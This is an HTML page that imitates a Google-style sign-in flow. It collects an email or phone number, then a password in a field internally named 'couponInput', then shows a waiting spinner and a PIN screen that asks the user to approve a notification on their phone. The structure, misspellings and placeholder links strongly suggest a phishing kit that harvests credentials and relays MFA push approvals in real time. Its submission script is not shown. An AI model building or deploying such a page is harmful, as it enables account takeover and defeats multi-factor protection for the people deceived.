<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Sign in</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="mobile-wrapper">
    <div class="card" id="mainCard">
      <!-- Top indeterminate progress bar (visible during waiting) -->
      <div class="progress-bar" id="progressBar">
        <div class="progress-line"></div>
      </div>

      <!-- Google Material Style Header -->
      <div class="header-section">
        <div class="logo-container">
          <img src="logo.png" alt="" class="app-logo" />
        </div>
        <h1 class="heading-title" id="pageTitle">Sign in</h1>
        <p class="heading-subtitle" id="pageSubtitle">to continiue please login your account</p>
      </div>

      <!-- Step 1: Username -->
      <div class="step-view" id="step1">
        <div class="input-group">
          <input type="text" id="usernameInput" autocomplete="off" placeholder=" " required />
          <label for="usernameInput">Email or phone</label>
        </div>
        <div class="link-row">
          <a href="javascript:void(0)" class="text-link">Forgot email?</a>
        </div>
        <div class="action-row">
          <a href="javascript:void(0)" class="btn-text-link">Create account</a>
          <button type="button" class="btn btn-primary" id="btnNext1">Next</button>
        </div>
      </div>

      <!-- Step 2: Coupon Code -->
      <div class="step-view hidden" id="step2">
        <div class="user-chip" id="userChip">
          <div class="chip-avatar">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
            </svg>
          </div>
          <span class="chip-text" id="chipUsername"></span>
        </div>
        <div class="input-group">
          <input type="text" id="couponInput" autocomplete="off" placeholder=" " required />
          <label for="couponInput">Password</label>
        </div>
        <div class="link-row">
          <a href="javascript:void(0)" class="text-link">Forgot Password?</a>
        </div>
        <div class="action-row">
          <button type="button" class="btn btn-secondary" id="btnBack2">Back</button>
          <button type="button" class="btn btn-primary" id="btnSubmit2">Next</button>
        </div>
      </div>

      <!-- Waiting Screen (Pure minimal Google login style spinner animation) -->
      <div class="step-view hidden" id="stepWaiting">
        <div class="spinner-container">
          <svg class="spinner" viewBox="0 0 50 50">
            <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="3"></circle>
          </svg>
        </div>
      </div>

      <!-- Step 3: Approved - 4 Digit PIN -->
      <div class="step-view hidden" id="step3">
        <p class="heading-subtitle3" id="pageSubtitle">This additional step shows that you are actually
trying to sign in</p>
        <div class="pin-display" id="pinDisplay">--</div>
        <div class="action-row center-action">
          <p class="heading-subtitle3" id="pageSubtitle3">We sent a notification to your Mobile. <br> Tap <b>Yes</b>
on the notification to verify that it is you.</p>
        </div>
      </div>

      <!-- Rejected Screen -->
      <div class="step-view hidden" id="stepRejected">
        <div class="rejected-mark"></div>
        <div class="action-row center-action">
          <button type="button" class="btn btn-secondary btn-full" id="btnRetry">Try again</button>
        </div>
      </div>

    </div>

    <!-- Google Login Style Footer: Language Select & Legal Links -->
    <div class="footer-section">
      <div class="language-dropdown-wrapper">
        <select class="language-select" id="languageSelect">
          <option value="en-US">English (United States)</option>
          <option value="en-GB">English (United Kingdom)</option>
          <option value="bn">বাংলা</option>
          <option value="es">Español</option>
          <option value="fr">Français</option>
          <option value="de">Deutsch</option>
          <option value="hi">हिन्दी</option>
        </select>
        <span class="select-arrow">
          <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
            <path d="M7 10l5 5 5-5z"/>
          </svg>
        </span>
      </div>

      <div class="footer-links">
        <a href="javascript:void(0)" class="footer-link">Help</a>
        <a href="javascript:void(0)" class="footer-link">Privacy</a>
        <a href="javascript:void(0)" class="footer-link">Terms</a>
      </div>
    </div>

  </div>

  <script src="app.js"></script>
</body>
</html>
